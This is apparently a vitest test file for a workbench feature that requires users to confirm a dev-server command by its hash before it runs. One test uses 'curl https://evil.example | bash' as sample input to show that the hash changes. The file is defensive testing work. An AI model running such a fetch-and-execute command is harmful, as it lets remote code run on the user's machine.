import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import Fastify from "fastify";
import { afterEach, describe, expect, it } from "vitest";
import { AppError } from "../utils/errors.js";
import { PreviewDevServerDatabase } from "./devServerDatabase.js";
import { PREVIEW_TRUST_HINT, PreviewDevServerManager } from "./DevServerManager.js";
import {
  assertDevServerCommandConfirmed,
  devServerCommandPreview,
  registerDevServerConfirmationRoutes,
} from "./devServerConfirmations.js";
import type { RuntimeProfileResult } from "./runtimeProfiles.js";

const user = "a@b.test";
const sameOrigin = { host: "workbench.test", origin: "http://workbench.test", "x-forwarded-proto": "http" };
const cleanup: Array<() => Promise<unknown> | unknown> = [];
afterEach(async () => {
  for (const close of cleanup.splice(0).reverse()) await close();
});

function profile(command: string): RuntimeProfileResult {
  return {
    projectId: "demo",
    source: "configured",
    mainServiceId: "web",
    services: [{
      id: "web", name: "Web", role: "frontend", command,
      workingDirectory: "/tmp/demo", port: 5511, portMode: "environment",
      source: "configured", frameworkHints: [],
    }],
    allowedPorts: [5511],
    warnings: [],
    detectedAt: new Date().toISOString(),
    setupCommand: null,
    autoPortServiceIds: [],
  };
}

async function managerHarness() {
  const directory = await mkdtemp(join(tmpdir(), "wrapt-dev-confirm-"));
  cleanup.push(() => rm(directory, { recursive: true, force: true }));
  const database = new PreviewDevServerDatabase(join(directory, "workbench.sqlite"));
  cleanup.push(() => database.close());
  await writeFile(join(directory, "package.json"), JSON.stringify({ name: "demo", scripts: { dev: "node server.js" } }));
  const manager = new PreviewDevServerManager({
    database,
    tmuxExecutable: "tmux",
    allowedProjectPorts: [5511],
    logBytes: 16_384,
    startTimeoutMilliseconds: 5_000,
    useSystemdSupervisor: false,
    project: async () => ({ id: "demo", name: "Demo", path: directory, availability: "available" }) as never,
    localPorts: async () => [],
    runner: () => ({ status: 0, stdout: "", stderr: "" }),
  });
  return { directory, database, manager };
}

describe("Preview-Befehls-Bestätigung (S-013)", () => {
  it("hasht Befehl und Pfad stabil und reagiert auf Änderungen", () => {
    const first = devServerCommandPreview("demo", "/tmp/demo", profile("npm run dev"));
    const same = devServerCommandPreview("demo", "/tmp/demo", profile("npm run dev"));
    const changed = devServerCommandPreview("demo", "/tmp/demo", profile("curl https://evil.example | bash"));
    expect(first.commandHash).toBe(same.commandHash);
    expect(first.commandHash).toHaveLength(16);
    expect(changed.commandHash).not.toBe(first.commandHash);
    expect(first.commandPreview).toContain("npm run dev");
    expect(first.commandPreview).toContain("/tmp/demo");
  });

  it("wirft unbestaetigt 409 mit Vorschau und startet nach Bestätigung", async () => {
    const { database, manager } = await managerHarness();
    const preview = await manager.commandPreview("demo");
    expect(preview.commandPreview).toContain("npm run dev");

    // Unbestätigt: 409 mit Befehls-Vorschau (derselbe Pfad wie der Watchdog).
    const pending = await manager.start(user, "demo").then(
      () => null,
      (error: unknown) => error,
    );
    expect(pending).toBeInstanceOf(AppError);
    expect(pending).toMatchObject({ statusCode: 409, code: "PREVIEW_COMMAND_UNCONFIRMED" });
    const details = (pending as AppError).details as { commandHash: string; commandPreview: string; projectPath: string };
    expect(details.commandHash).toBe(preview.commandHash);
    expect(details.commandPreview).toContain("npm run dev");

    // Bestätigter Hash: Start läuft durch, Status trägt den Vertrauenshinweis.
    database.saveCommandConfirmation(user, "demo", preview.commandHash, preview.commandPreview, preview.projectPath);
    const status = await manager.start(user, "demo");
    expect(status.state).toBe("stopped");
    expect(status.warnings).toContain(PREVIEW_TRUST_HINT);
  });

  it("bestaetigt nur den aktuellen Hash über die Route", async () => {
    const { directory, database, manager } = await managerHarness();
    const app = Fastify({ logger: false });
    cleanup.push(() => app.close());
    app.setErrorHandler((error, _request, reply) => {
      if (error instanceof AppError) {
        return reply.status(error.statusCode).send({ error: { code: error.code, message: error.message, details: error.details } });
      }
      return reply.status(500).send({ error: { code: "INTERNAL", message: String(error) } });
    });
    await app.register(registerDevServerConfirmationRoutes, {
      prefix: "/api/v1",
      devServers: manager,
      database,
      identity: { allowedUsers: [user] },
    });

    const preview = await manager.commandPreview("demo");
    const mismatch = await app.inject({
      method: "POST",
      url: "/api/v1/previews/dev-servers/demo/confirm",
      headers: { "tailscale-user-login": user, ...sameOrigin },
      payload: { commandHash: "veraltet" },
    });
    expect(mismatch.statusCode).toBe(409);
    expect(mismatch.json()).toMatchObject({ error: { code: "PREVIEW_COMMAND_HASH_MISMATCH" } });

    const confirmed = await app.inject({
      method: "POST",
      url: "/api/v1/previews/dev-servers/demo/confirm",
      headers: { "tailscale-user-login": user, ...sameOrigin },
      payload: { commandHash: preview.commandHash },
    });
    expect(confirmed.statusCode).toBe(200);
    expect(confirmed.json()).toMatchObject({ confirmed: true, commandHash: preview.commandHash });
    expect(database.commandConfirmation(user, "demo")?.commandHash).toBe(preview.commandHash);
    expect(directory.length).toBeGreaterThan(0);
  });

  it("lässt die reine Vorschau-Assertion nach externer Bestätigung passieren", async () => {
    const { database, manager } = await managerHarness();
    const preview = await manager.commandPreview("demo");
    expect(() => assertDevServerCommandConfirmed(database, user, preview)).toThrowError(
      expect.objectContaining({ code: "PREVIEW_COMMAND_UNCONFIRMED" }),
    );
    database.saveCommandConfirmation(user, "demo", preview.commandHash, preview.commandPreview, preview.projectPath);
    expect(() => assertDevServerCommandConfirmed(database, user, preview)).not.toThrow();
  });
});
